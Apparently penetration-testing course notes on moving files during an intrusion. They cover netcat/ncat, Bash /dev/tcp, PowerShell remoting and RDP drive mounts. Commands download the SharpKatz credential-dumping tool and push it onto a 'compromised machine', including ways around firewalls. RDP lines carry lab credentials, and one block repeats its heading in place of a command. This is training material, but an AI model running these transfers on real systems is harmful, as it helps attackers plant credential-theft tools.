
### File Transfer with Netcat and Ncat

The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target

- first start Netcat (nc) on the compromised machine, listening with option -l, selecting the port to listen with the option -p 8000, and redirect the stdout using a single greater-than > followed by the filename, SharpKatz.exe

**NetCat - Compromised Machine - Listening on Port 8000**
```
nc -l -p 8000 > SharpKatz.exe
```

If the compromised machine is using Ncat, we'll need to specify --recv-only to close the connection once the file transfer is finished

**Ncat - Compromised Machine - Listening on Port 8000**
```
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

- From the attack host connect to the target over port 8000 with Netcat and send the file as input to Ncat
- The option -q 0 will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed

**Netcat - Attack Host - Sending File to Compromised machine**
```
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
```
```
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

- we can opt for --send-only rather than -q. The --send-only flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted
- Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with --send-only, there is no need to anticipate further incoming information

**Ncat - Attack Host - Sending File to Compromised machine**
```
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
```
```
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

- Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. 
- This method is useful in scenarios where there's a firewall blocking inbound connections. 
- Let's listen on port 443 on our Pwnbox and send the file SharpKatz.exe as input to Netcat

**Attack Host - Sending File as Input to Netcat**
```
Attack Host - Sending File as Input to Netcat
```

**Compromised Machine Connect to Netcat to Receive the File**
```
nc 192.168.49.128 443 > SharpKatz.exe
```

Perform the same operations with Ncat

**Attack Host - Sending File as Input to Ncat**
```
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

**Compromised Machine Connect to Ncat to Receive the File**
```
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

- If ncat or netcat aren't available, bash supports read/write operations via /dev/TCP 
- Writing to this particular file makes Bash open a TCP connection to host:port, and this feature may be used for file transfers

**NetCat - Sending File as Input to Netcat**
```
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

**Ncat - Sending File as Input to Netcat**
```
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

**Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File**
```
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### PowerShell Session File Transfer 

- PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions
- Enabling PowerShell remoting creates both an HTTP and an HTTPS listener
- The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from DC01 to DATABASE01 and vice versa

**From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.**
```
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Because this session already has privileges over DATABASE01, we don't need to specify credentials. In the example below, a session is created to the remote computer named DATABASE01 and stores the results in the variable named $Session

```
$Session = New-PSSession -ComputerName DATABASE01
```

**Copy samplefile.txt from our Localhost to the DATABASE01 Session**
```
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

**Copy DATABASE.txt from DATABASE01 Session to our Localhost**
```
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```


### RDP

Use the Linux tools below to RDP into a machine:
- xfreerdp
- rdesktop
- remmina

As an alternative to copy and paste, we can mount a local resource on the target RDP server. rdesktop or xfreerdp can be used to expose a local folder in the remote RDP session


**Mounting a Linux Folder Using rdesktop**
```
rdesktop 10.129.201.55 -d HTB -u htb-student -p 'HTB_@cademy_stdnt!' -r disk:linux='/home/dan/test'
```

**Mounting a Linux Folder Using xfreerdp**
```
xfreerdp /v:10.129.201.55 /d:HTB /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:linux,/home/dan/test
```





